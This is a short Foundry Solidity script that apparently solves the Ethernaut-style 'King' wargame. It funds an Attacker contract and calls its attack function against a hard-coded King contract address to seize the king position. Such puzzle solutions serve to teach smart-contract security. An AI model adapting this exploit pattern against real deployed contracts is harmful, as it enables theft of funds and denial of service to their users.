// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
import "forge-std/console.sol";

contract AttackScript is Script {
    function setUp() public {}

    //solveed by using the selfdestruct() to send ether to another contract
    function run() public {
        vm.startBroadcast();
        King kingContract = King(
            payable(0x1d65AB46D84e509D4Df3a3d518A0dA52a1c19460)
        );

        //create attacker
        Attacker attacker = new Attacker(kingContract);

        (bool success, ) = address(attacker).call{
            value: kingContract.prize() + 1000 wei
        }("");
        require(success == true, "script failed");

        // call attack fcn
        attacker.attack();

        console.log('new king is', kingContract._king());
        vm.stopBroadcast();
    }
}
